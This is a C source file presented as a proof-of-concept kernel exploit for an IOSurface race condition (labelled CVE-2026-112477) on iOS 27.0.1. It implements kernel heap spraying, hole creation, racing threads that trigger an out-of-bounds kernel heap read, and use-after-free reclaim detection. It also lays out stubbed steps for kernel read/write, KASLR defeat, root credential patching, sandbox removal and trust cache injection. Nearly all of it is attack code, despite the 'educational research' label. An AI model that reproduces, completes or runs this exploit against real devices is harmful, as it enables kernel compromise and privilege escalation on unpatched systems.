/*
 * IOSurface Race Condition PoC for CVE-2026-112477
 * Educational jailbreak research only. For use on devices you own.
 *
 * Target: iPad Mini (iPad16,1), A17 Pro, iOS 27.0.1
 * Bug: Race condition between IOSurface creation and property access.
 *      A surface declaring a 0x100000000 header region is accepted
 *      while the real allocation is only 64 KiB. Concurrent access
 *      during creation yields a UAF on the kernel allocation.
 * Fix: iOS 27.2 (improved locking in IOSurfaceRoot)
 *
 * Build: clang -arch arm64e -framework IOKit -framework IOSurface \
 *        -framework CoreFoundation -lpthread -o iosurface_race iosurface_race.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <unistd.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>
#include <CoreFoundation/CoreFoundation.h>

#define SPRAY_COUNT      256
#define RACE_THREADS     4
#define RACE_ITERATIONS  10000
#define HEADER_SIZE_FAKE 0x100000000ULL  /* 4 GiB declared header */
#define HEADER_SIZE_REAL 0x10000         /* 64 KiB actual allocation */
#define SURFACE_WIDTH    64
#define SURFACE_HEIGHT   64
#define SURFACE_BPE      4

/* --- IOSurface user client external methods (from reverse engineering) --- */

enum {
    kIOSurfaceMethodCreate       = 0,
    kIOSurfaceMethodRelease      = 1,
    kIOSurfaceMethodLock         = 2,
    kIOSurfaceMethodUnlock       = 3,
    kIOSurfaceMethodGetValue     = 6,
    kIOSurfaceMethodSetValue     = 9,
    kIOSurfaceMethodRemoveValue  = 10,
};

/* --- Globals --- */

static io_connect_t g_conn = MACH_PORT_NULL;
static volatile int g_race_go = 0;
static volatile int g_race_done = 0;
static uint32_t g_target_id = 0;

/* --- IOSurface helpers --- */

static io_connect_t
open_iosurface_uc(void)
{
    io_service_t service;
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr;

    service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL) {
        fprintf(stderr, "[-] IOSurfaceRoot service not found\n");
        return MACH_PORT_NULL;
    }

    kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] IOServiceOpen failed: 0x%x\n", kr);
        return MACH_PORT_NULL;
    }

    printf("[+] Opened IOSurfaceRoot user client: 0x%x\n", conn);
    return conn;
}

static IOSurfaceRef
create_surface(uint32_t w, uint32_t h, uint32_t bpe)
{
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    int32_t width  = (int32_t)w;
    int32_t height = (int32_t)h;
    int32_t bpp    = (int32_t)bpe;
    int32_t pitch  = (int32_t)(w * bpe);
    int32_t alloc  = (int32_t)(w * h * bpe);

    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &width);
    CFDictionarySetValue(props, kIOSurfaceWidth, n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &height);
    CFDictionarySetValue(props, kIOSurfaceHeight, n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpp);
    CFDictionarySetValue(props, kIOSurfaceBytesPerElement, n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &pitch);
    CFDictionarySetValue(props, kIOSurfaceBytesPerRow, n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc);
    CFDictionarySetValue(props, kIOSurfaceAllocSize, n); CFRelease(n);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(props);
    return surf;
}

/*
 * Create a surface with an oversized header region declaration.
 * The kernel allocates only HEADER_SIZE_REAL bytes but records
 * HEADER_SIZE_FAKE in the surface metadata. The race window is
 * between the allocation and the metadata write.
 */
static IOSurfaceRef
create_oversized_surface(void)
{
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    int32_t width  = SURFACE_WIDTH;
    int32_t height = SURFACE_HEIGHT;
    int32_t bpe    = SURFACE_BPE;
    int32_t pitch  = SURFACE_WIDTH * SURFACE_BPE;
    int32_t alloc  = SURFACE_WIDTH * SURFACE_HEIGHT * SURFACE_BPE;

    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &width);
    CFDictionarySetValue(props, kIOSurfaceWidth, n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &height);
    CFDictionarySetValue(props, kIOSurfaceHeight, n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
    CFDictionarySetValue(props, kIOSurfaceBytesPerElement, n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &pitch);
    CFDictionarySetValue(props, kIOSurfaceBytesPerRow, n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc);
    CFDictionarySetValue(props, kIOSurfaceAllocSize, n); CFRelease(n);

    /*
     * The header_size property triggers the vulnerable code path.
     * When set to a value > the actual allocation, the race between
     * size validation and metadata commit allows a window where
     * the kernel treats the small allocation as if it were large.
     */
    int64_t header_size = (int64_t)HEADER_SIZE_FAKE;
    n = CFNumberCreate(NULL, kCFNumberSInt64Type, &header_size);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeaderSize"), n);
    CFRelease(n);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(props);
    return surf;
}

/* --- Spray infrastructure --- */

typedef struct {
    IOSurfaceRef surfaces[SPRAY_COUNT];
    uint32_t     ids[SPRAY_COUNT];
    int          count;
} spray_ctx_t;

static void
spray_surfaces(spray_ctx_t *ctx)
{
    printf("[*] Spraying %d IOSurface objects...\n", SPRAY_COUNT);
    ctx->count = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        ctx->surfaces[i] = create_surface(SURFACE_WIDTH, SURFACE_HEIGHT, SURFACE_BPE);
        if (ctx->surfaces[i]) {
            ctx->ids[i] = IOSurfaceGetID(ctx->surfaces[i]);
            ctx->count++;
        }
    }
    printf("[+] Sprayed %d surfaces (IDs %u-%u)\n",
           ctx->count, ctx->ids[0], ctx->ids[ctx->count - 1]);
}

static void
free_spray_holes(spray_ctx_t *ctx)
{
    printf("[*] Creating holes (freeing even-indexed surfaces)...\n");
    int freed = 0;
    for (int i = 0; i < ctx->count; i += 2) {
        if (ctx->surfaces[i]) {
            CFRelease(ctx->surfaces[i]);
            ctx->surfaces[i] = NULL;
            freed++;
        }
    }
    printf("[+] Freed %d surfaces (holes created)\n", freed);
}

/* --- Race threads --- */

typedef struct {
    int thread_id;
    int iterations;
    int wins;
} race_thread_ctx_t;

/*
 * Thread A: rapidly creates oversized surfaces.
 * The creation path has a window between allocation and metadata commit
 * where the size field hasn't been validated yet.
 */
static void *
race_creator(void *arg)
{
    race_thread_ctx_t *ctx = (race_thread_ctx_t *)arg;

    while (!g_race_go)
        usleep(1);

    for (int i = 0; i < ctx->iterations && !g_race_done; i++) {
        IOSurfaceRef surf = create_oversized_surface();
        if (surf) {
            uint32_t sid = IOSurfaceGetID(surf);
            if (sid && g_target_id == 0) {
                g_target_id = sid;
            }
            CFRelease(surf);
        }
    }

    return NULL;
}

/*
 * Thread B: rapidly accesses surface properties during creation.
 * If we hit the race window, we read/write the surface while the
 * kernel still thinks it has the oversized header region, allowing
 * OOB access into adjacent kernel memory.
 */
static void *
race_accessor(void *arg)
{
    race_thread_ctx_t *ctx = (race_thread_ctx_t *)arg;

    while (!g_race_go)
        usleep(1);

    for (int i = 0; i < ctx->iterations && !g_race_done; i++) {
        uint32_t tid = g_target_id;
        if (tid == 0)
            continue;

        IOSurfaceRef surf = IOSurfaceLookup(tid);
        if (!surf)
            continue;

        /*
         * Try to lock the surface with the oversized region.
         * If we win the race, the lock succeeds and we can access
         * memory beyond the actual allocation (OOB into kernel heap).
         */
        IOReturn ret = IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
        if (ret == kIOReturnSuccess) {
            void *base = IOSurfaceGetBaseAddress(surf);
            size_t alloc = IOSurfaceGetAllocSize(surf);

            if (alloc > HEADER_SIZE_REAL) {
                /*
                 * Race won: kernel reports allocation size larger than
                 * actual backing memory. We have OOB access.
                 */
                printf("[!] RACE WON: surface %u reports alloc=0x%zx "
                       "(real=0x%x) base=%p\n",
                       tid, alloc, HEADER_SIZE_REAL, base);
                ctx->wins++;

                /*
                 * Read beyond the real allocation to leak kernel heap data.
                 * On a real device this would read adjacent kernel objects.
                 */
                if (base && alloc > HEADER_SIZE_REAL + 8) {
                    uint64_t *oob = (uint64_t *)((uint8_t *)base + HEADER_SIZE_REAL);
                    printf("[!] OOB read at +0x%x: 0x%016llx 0x%016llx\n",
                           HEADER_SIZE_REAL, oob[0], oob[1]);
                }
            }

            IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
        }

        CFRelease(surf);
        g_target_id = 0;
    }

    return NULL;
}

/* --- Kernel heap spray via IOSurface properties --- */

/*
 * Spray controlled data into the kernel heap via IOSurface property
 * dictionaries. Each property value lands in a kalloc zone allocation
 * matching its size. By sizing values to match the freed UAF object,
 * we can reclaim the freed allocation with controlled content.
 */
static void
spray_kernel_properties(spray_ctx_t *ctx, size_t value_size, uint8_t fill)
{
    printf("[*] Spraying %zu-byte kernel properties (fill=0x%02x)...\n",
           value_size, fill);

    uint8_t *data = malloc(value_size);
    memset(data, fill, value_size);

    /* Embed a marker so we can detect replacement */
    const uint64_t marker = 0x4141414141414141ULL;
    if (value_size >= sizeof(marker))
        memcpy(data, &marker, sizeof(marker));

    CFDataRef cf_data = CFDataCreate(NULL, data, value_size);

    int sprayed = 0;
    for (int i = 1; i < ctx->count; i += 2) {
        if (!ctx->surfaces[i])
            continue;

        char key[32];
        snprintf(key, sizeof(key), "spray_%d", i);
        CFStringRef cf_key = CFStringCreateWithCString(NULL, key,
            kCFStringEncodingUTF8);

        IOSurfaceSetValue(ctx->surfaces[i], cf_key, cf_data);
        CFRelease(cf_key);
        sprayed++;
    }

    CFRelease(cf_data);
    free(data);

    printf("[+] Sprayed %d properties of %zu bytes each\n", sprayed, value_size);
}

/* --- UAF detection --- */

/*
 * After the race, check if any surface's property read returns our
 * spray marker at an unexpected offset. This indicates the UAF
 * allocation was reclaimed by our spray and we have type confusion.
 */
static int
check_uaf_reclaim(spray_ctx_t *ctx)
{
    printf("[*] Checking for UAF reclaim...\n");

    for (int i = 1; i < ctx->count; i += 2) {
        if (!ctx->surfaces[i])
            continue;

        char key[32];
        snprintf(key, sizeof(key), "spray_%d", i);
        CFStringRef cf_key = CFStringCreateWithCString(NULL, key,
            kCFStringEncodingUTF8);

        CFTypeRef val = IOSurfaceCopyValue(ctx->surfaces[i], cf_key);
        CFRelease(cf_key);

        if (!val)
            continue;

        if (CFGetTypeID(val) == CFDataGetTypeID()) {
            CFDataRef d = (CFDataRef)val;
            const uint8_t *bytes = CFDataGetBytePtr(d);
            CFIndex len = CFDataGetLength(d);

            if (len >= 8) {
                uint64_t first = *(uint64_t *)bytes;
                if (first != 0x4141414141414141ULL && first != 0) {
                    printf("[!] Surface %d property corrupted: "
                           "first 8 bytes = 0x%016llx (expected 0x4141...)\n",
                           i, first);
                    printf("[!] This may indicate UAF reclaim — "
                           "kernel object overlaps our data\n");
                    CFRelease(val);
                    return 1;
                }
            }
        }
        CFRelease(val);
    }

    printf("[*] No UAF reclaim detected this round\n");
    return 0;
}

/* --- Kernel R/W primitives (post-exploitation) --- */

typedef struct {
    IOSurfaceRef confused_surface;
    uint32_t     confused_id;
    uint64_t     kbase;
    int          rw_ready;
} krw_ctx_t;

/*
 * Once we have a type-confused IOSurface object (its kernel backing
 * overlaps with data we control), we can build read/write primitives:
 *
 * READ:  Set surface property pointing to target address.
 *        Read through the confused surface → kernel dereferences
 *        our controlled pointer → returns data at target.
 *
 * WRITE: Same approach but with a SetValue call. The kernel
 *        writes through our controlled pointer to the target.
 *
 * These primitives require knowing the layout of the IOSurface
 * kernel object (offsets differ per iOS version).
 */
static uint64_t
kread64(krw_ctx_t *ctx, uint64_t addr)
{
    if (!ctx->rw_ready) {
        fprintf(stderr, "[-] kread64: R/W not ready\n");
        return 0;
    }

    /*
     * TODO: Implement actual kernel read via confused IOSurface.
     * This requires:
     * 1. Known offset of the backing-store pointer in IOSurface object
     * 2. Overwrite that pointer with target address
     * 3. Lock surface → kernel reads from our target address
     * 4. Return the read data
     *
     * The exact offset depends on the iOS 27.0.1 IOSurface kext layout
     * which must be determined from the kernelcache.
     */
    (void)addr;
    return 0;
}

static void
kwrite64(krw_ctx_t *ctx, uint64_t addr, uint64_t value)
{
    if (!ctx->rw_ready) {
        fprintf(stderr, "[-] kwrite64: R/W not ready\n");
        return;
    }

    /*
     * TODO: Same approach as kread64 but writes through the pointer.
     * Requires the same IOSurface object layout knowledge.
     */
    (void)addr;
    (void)value;
}

/* --- KASLR defeat --- */

/*
 * Use CVE-2026-113910 (kernel info disclosure) or leaked pointers
 * from the IOSurface OOB read to defeat KASLR.
 *
 * The OOB read during the race can leak kernel heap pointers.
 * These can be used to:
 * 1. Determine the kernel slide (KASLR)
 * 2. Find our process's proc/task structures
 * 3. Locate the trust cache linked list
 */
static uint64_t
defeat_kaslr(krw_ctx_t *ctx)
{
    /*
     * TODO: Implement KASLR defeat.
     * Pattern: scan leaked pointers for known kernel text signatures.
     * The kernel base on arm64e is 0xFFFFFE0007004000 + slide.
     * Pointers in the __DATA segment give away the slide.
     */
    (void)ctx;
    return 0;
}

/* --- Post-exploitation --- */

/*
 * After achieving kernel R/W:
 * 1. Find our proc structure (walk allproc list)
 * 2. Modify ucred to get root (uid=0, gid=0)
 * 3. Remove sandbox profile
 * 4. Inject CDHashes into trust cache
 *
 * Trust cache injection on iOS 27 with SPTM:
 * - Static trust cache is in SPTM-protected memory (can't write directly)
 * - Linked trust cache entries are in kernel memory (writable with R/W)
 * - Allocate a new trust cache entry, fill CDHashes, link it in
 * - This is the Dopamine/rootless approach
 */
static int
escalate_privileges(krw_ctx_t *ctx)
{
    if (!ctx->rw_ready || !ctx->kbase) {
        fprintf(stderr, "[-] Need kernel R/W + KASLR defeat first\n");
        return -1;
    }

    printf("[*] Starting privilege escalation...\n");

    /*
     * Step 1: Find allproc
     * Offset from kernel base depends on iOS version.
     * For iOS 27.0.1 on A17 Pro, extract from kernelcache.
     */
    uint64_t allproc = ctx->kbase + 0x0; /* TODO: fill from kernelcache */

    /*
     * Step 2: Walk proc list to find our process
     * struct proc { ... uint64_t p_list.le_next; ... pid_t p_pid; ... }
     */
    pid_t our_pid = getpid();
    printf("[*] Our PID: %d\n", our_pid);

    /*
     * Step 3: Modify ucred (uid/gid to 0)
     * struct ucred { ... uid_t cr_uid; uid_t cr_ruid; ... }
     */

    /*
     * Step 4: Trust cache injection
     * - Allocate kernel memory for trust cache entry (via IOSurface property)
     * - Fill with CDHashes of jailbreak binaries
     * - Link into the trust cache linked list
     * - Binaries are now trusted by AMFI
     */

    printf("[!] Privilege escalation framework ready — "
           "needs kernelcache offsets for iOS 27.0.1\n");
    return 0;
}

/* --- Main exploitation flow --- */

int
main(int argc, char **argv)
{
    int rounds = 10;
    if (argc > 1)
        rounds = atoi(argv[1]);

    printf("=== CVE-2026-112477 IOSurface Race PoC ===\n");
    printf("Target: iOS 27.0.1, A17 Pro (arm64e)\n");
    printf("Rounds: %d\n\n", rounds);

    /* Phase 1: Open IOSurface user client */
    g_conn = open_iosurface_uc();
    if (g_conn == MACH_PORT_NULL)
        return 1;

    /* Phase 2: Heap spray — fill the kernel heap with IOSurface objects */
    spray_ctx_t spray = {0};
    spray_surfaces(&spray);

    /* Phase 3: Create holes for UAF reclaim */
    free_spray_holes(&spray);

    /* Phase 4: Race to trigger the bug */
    printf("\n[*] Starting race (threads=%d, iterations=%d)...\n",
           RACE_THREADS, RACE_ITERATIONS);

    int total_wins = 0;

    for (int round = 0; round < rounds; round++) {
        printf("\n--- Round %d/%d ---\n", round + 1, rounds);

        g_race_go = 0;
        g_race_done = 0;
        g_target_id = 0;

        pthread_t creators[RACE_THREADS / 2];
        pthread_t accessors[RACE_THREADS / 2];
        race_thread_ctx_t creator_ctx[RACE_THREADS / 2];
        race_thread_ctx_t accessor_ctx[RACE_THREADS / 2];

        for (int i = 0; i < RACE_THREADS / 2; i++) {
            creator_ctx[i] = (race_thread_ctx_t){i, RACE_ITERATIONS, 0};
            accessor_ctx[i] = (race_thread_ctx_t){i, RACE_ITERATIONS, 0};

            pthread_create(&creators[i], NULL, race_creator, &creator_ctx[i]);
            pthread_create(&accessors[i], NULL, race_accessor, &accessor_ctx[i]);
        }

        /* Release all threads simultaneously */
        g_race_go = 1;

        for (int i = 0; i < RACE_THREADS / 2; i++) {
            pthread_join(creators[i], NULL);
            pthread_join(accessors[i], NULL);
            total_wins += accessor_ctx[i].wins;
        }

        /* Phase 5: Spray properties into freed holes */
        spray_kernel_properties(&spray, HEADER_SIZE_REAL, 0x41);

        /* Phase 6: Check for UAF reclaim */
        if (check_uaf_reclaim(&spray)) {
            printf("[!] UAF reclaim detected in round %d!\n", round + 1);
            break;
        }
    }

    printf("\n=== Results ===\n");
    printf("Race wins: %d\n", total_wins);
    printf("Note: kernel panic during run = positive signal (OOB hit unmapped)\n");

    /* Cleanup */
    for (int i = 0; i < spray.count; i++) {
        if (spray.surfaces[i])
            CFRelease(spray.surfaces[i]);
    }

    if (g_conn != MACH_PORT_NULL)
        IOServiceClose(g_conn);

    return 0;
}
